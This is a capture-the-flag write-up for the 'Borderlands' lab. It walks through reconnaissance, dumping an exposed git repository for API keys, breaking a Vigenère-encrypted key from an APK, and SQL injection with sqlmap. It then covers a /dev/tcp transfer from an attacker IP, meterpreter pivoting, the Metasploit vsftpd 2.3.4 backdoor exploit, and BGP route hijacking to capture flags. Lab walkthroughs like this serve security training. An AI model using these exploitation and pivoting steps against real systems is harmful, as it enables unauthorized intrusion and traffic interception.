> Borderlands

**export IP=10.10.20.175**

# Nmap

sudo nmap -sC -sV -T4 -Pn -vvv -p- $IP

```
22/tcp   open   ssh        syn-ack      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http       syn-ack      nginx 1.14.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.20.175:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: added mobile apk for beta testing. 
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Context Information Security - HackBack 2
```

# Gobuster

sudo gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,txt,js,html,zip,bak,cgi,tar,sql -o gobuster/initial

```
/index.php (Status: 200)
/home.php (Status: 302)
/info.php (Status: 200)
/api.php (Status: 200)
/functions.php (Status: 200)
```

# Git dumper

/opt/GitTools/Dumper/gitdumper.sh http://$IP/.git/ .

We got the .git directory now let's try to find something interesting.

git log .

```
commit b2f776a52fe81a731c6c0fa896e7f9548aafceab
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:41:00 2019 +0100

    removed sensitive data
```

git show b2f776a52fe81a731c6c0fa896e7f9548aafceab

```
 require_once("functions.php");
 
-if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtCotiTZpf0HC"))
+if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
 {
     die("Invalid API key");
 }
```

Ooh! we got the git flag! `GITtFi80llzs4TxqMWtCotiTZpf0HC`.

We can get an apk file. We can download it and decode it using apktool `apktool d mobile-app-prototype.apk`

And we can open it in jadx and find an `encrypted_api_key` string in main2activity. Let's search for it in the decoded files. `grep -rn 'encrypted_api_key'`

```
smali/com/example/ctf1/R$string.smali:98:.field public static final encrypted_api_key:I = 0x7f0b0028
res/values/strings.xml:43:    <string name="encrypted_api_key">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</string>
res/values/public.xml:892:    <public type="string" name="encrypted_api_key" id="0x7f0b0028" />
```

Here we have 2 strings of API Key and in the previous git key we have the other one  `ANDVOWLDLAS5Q8OQZ2tu` and now `CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo`. 

# Decrypting

```
Plain Text : ANDVOWLDLAS5Q8OQZ2tu
Encrypted Text : CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo
```

Looks like viginer cipher. And we find the key as `CONTEXT`. On decoding it we can find the decypted text `ANDVOWLDLAS5Q8OQZ2tuIPGcOu2mXk`. We got the api key.

We can download all the files by githack. And we can get all the files. Looking at api.php and home.php we can see how the request works. 

# api.php

```
<?php

require_once("functions.php");

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
{
    die("Invalid API key");
}

if (!isset($_GET['documentid']))
{
    die("Invalid document ID");
}

/*
if (!isset($_GET['newname']) || $_GET['newname'] == "")
{
    die("invalid document name");
}
*/

$conn = setup_db_connection();

//UpdateDocumentName($conn, $_GET['documentid'], $_GET['newname']);

$docDetails = GetDocumentDetails($conn, $_GET['documentid']);
if ($docDetails !== null)
{
    //print_r($docDetails);
    echo ("Document ID: ".$docDetails['documentid']."<br />");
    echo ("Document Name: ".$docDetails['documentname']."<br />");
    echo ("Document Location: ".$docDetails['location']."<br />");
}

?>
```

# howe.php

```
<?php

session_start();
require_once("functions.php");

$conn = setup_db_connection();

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true)
{
    header("Location: index.php");
    die();
}

echo ("<p>Click on a link below to view the document properties</p>");


$stmt = $conn -> prepare('SELECT documentid, documentname, location FROM documents');

$stmt -> execute();
$stmt -> store_result();
$stmt -> bind_result($documentid, $document_name, $location);

$resultsArray = [];
echo ("<ul>");
while ($stmt -> fetch()) {
    echo ('<li><a href="api.php?documentid='.$documentid.'&amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD">'.$document_name.'</a></li>');
    $resultsArray[] = array("documentid" => $documentid, "documentname" => $document_name, "location" => $location);
}
echo ("</ul>");

/*
if (isset($_GET['documentid']) && is_numeric($_GET['documentid']))
{
    foreach ($resultsArray as $result)
    {
        if ($result["documentid"] == $_GET['documentid'])
        {
            echo "<p>Enter the new name for the document: ".$result['documentname']."</p>";
            echo ('<form method="GET" action="api.php">');
            echo ('<input type="hidden" id="documentid" name="documentid" value="'.$_GET['documentid'].'" />');
            echo ('<input type="hidden" id="apikey" name="apikey" value="WEBLhvOJAH8d50Z4y5G5g4McG1GMGD" />');
            echo ('<input type="text" id="newname" name="newname" />');
            echo ('<input type="submit" />');
        }
    }
}
*/

?>
```

We can see the requirements and when we try to access api.php in browser it says `Invalid API Key`. So now we give the correct request to the server `http://10.10.20.175/api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD`. 

Let's capture the request in burp and get a reverse shell using sqlmap.

sqlmap -r requests.txt --dbs --batch

```
[*] information_schema
[*] myfirstwebsite
[*] mysql
[*] performance_schema
[*] sys
```

# Enumeration

Let's try to start from nmap. Transferring nmap as static binary.

ncat -lvnp 800 < nmap
cat > /tmp/nmap < /dev/tcp/10.8.107.21/800

And now after giving permissins we can execute nmap. Let's specify the IP Range 10.x.x.x is used by Tryhackme and 172.16.0.x is used by companies like Context and finallu 192.168.x.x is for home router. So the most propable one would be 172.16.0.0/16.

Let's do a fast scan and we can fin the subnet range 

./nmap -sn -T5 --min-parallelism 100  172.16.0.0/16

```
Nmap scan report for hackback_router1_1.hackback_r_1_ext (172.16.1.128)
``` 

./nmap -vvv 172.16.1.0/24

```
Nmap scan report for app.ctx.ctf (172.16.1.10)
Host is up, received syn-ack (0.00025s latency).
Scanned at 2021-01-03 11:58:47 UTC for 2s
Not shown: 1206 closed ports
Reason: 1206 conn-refused
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for hackback_router1_1.hackback_r_1_ext (172.16.1.128)
Host is up, received conn-refused (0.00027s latency).
Scanned at 2021-01-03 11:58:47 UTC for 2s
Not shown: 1203 closed ports
Reason: 1203 conn-refused
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack
179/tcp  open  bgp     syn-ack
2601/tcp open  zebra   syn-ack
2605/tcp open  bgpd    syn-ack
```

We are in 172.16.1.10 adn we have less resources but `172.16.1.128` has ftp,bgp open. Let;s port forward ftp to localhost using meterpreter.

portfwl -add -l 21 -p 21 -r 172.16.1.128

And nowe accessing ftp in our local machine we can find the banner.

ftp localhost 21

```
Trying 127.0.0.1...
Connected to localhost.
220 (vsFTPd 2.3.4)
```

Let's search an exploit for it. Let's manually exploit it

# Exploitation

For this exploit we have to 1st port forward 21 then exploit and next forward 6200 mad exploiting we can get a root shell!

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 127.0.0.1
```

In Meterpreter, type `portfwd add -l 6200 -p 6200 -r 172.16.1.128` and in metasploit we can exploit it again and get the root shell!!!

We can find the router 1 flag in root directory.

# Router1 flag

```
{FLAG:Router1:c877f00ce2b886446395150589166dcd}
```

And for next flag we exploit BGP(Border Gateway Protocol). 

vtysh => to access BGP

We are trying to hijack BGP. We have to route traffic from one IP to another IP. Let's enter into BGP Configuration mode using `config terminal`.

```
router1.ctx.ctf(config)# router bgp 60001
router1.ctx.ctf(config)# network 172.16.2.0/25
router1.ctx.ctf(config)# network 172.16.3.0/25
router1.ctx.ctf(config)# end
router1.ctx.ctf# clear ip bgp *
```

And caputring the network packets using `tcpdump -i eth0 -A` we can get both flags after some time.

# Router 2 flag

```
{FLAG:UDP:3bb271d020df6cbe599a46d20e9fcb3c}
```

# Router 3 flag

```
{FLAG:TCP:8fb04648d6b2bd40af6581942fcf483e}
```